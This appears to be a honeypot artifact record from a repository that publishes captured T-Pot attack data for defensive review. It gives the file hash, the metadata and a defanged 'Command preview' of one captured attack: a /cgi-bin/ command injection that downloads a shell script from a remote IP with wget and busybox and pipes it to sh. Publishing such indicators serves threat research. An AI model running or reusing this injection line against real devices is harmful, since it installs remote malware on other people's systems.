# 385c8f857df27c67de5c3e2149e19e8b81dc006044506bb4276b2255f7b842f4

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `385c8f857df27c67de5c3e2149e19e8b81dc006044506bb4276b2255f7b842f4` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgi-bin/;cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s wavlink;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
